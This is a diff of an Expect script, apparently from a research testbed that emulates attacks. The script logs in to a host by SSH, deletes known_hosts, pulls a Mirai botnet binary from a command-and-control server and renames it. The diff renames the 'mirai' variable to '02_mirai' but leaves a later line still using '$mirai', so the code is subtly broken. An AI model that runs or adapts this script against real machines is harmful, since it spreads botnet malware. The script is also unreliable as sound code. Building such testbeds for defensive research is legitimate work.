@@ -11,8 +11,8 @@ set cnc_path [lindex $argv 8]
 
 set mirai_debug_path "Mirai-Source-Code/mirai/debug"
 set mirai_scan "mirai_scan"
-set mirai "mirai"
-#set configure_path "CREME/scripts/00configuration/prepared_files/malicious_client"
+set 02_mirai "mirai"
+#set configure_path "CREME/scripts/00_configuration/python_files/malicious_client"
 
 set timeout 120
 
@@ -25,7 +25,7 @@ send "yes\r"
 expect " password: "
 send "$password\r"
 
-# download malicious mirai file from cnc
+# download malicious 02_mirai file from cnc
 expect "*:~# "
 send "rm ~/.ssh/known_hosts\r"
 expect "*:~# "
@@ -34,7 +34,7 @@ expect "*continue connecting (yes/no*)? "
 send "yes\r"
 expect " password: "
 send "$cnc_pass\r"
-# change mirai name
+# change 02_mirai name
 expect "*:~# "
 send "mv $path/$mirai_scan.dbg $path/$mirai.dbg\r"
 
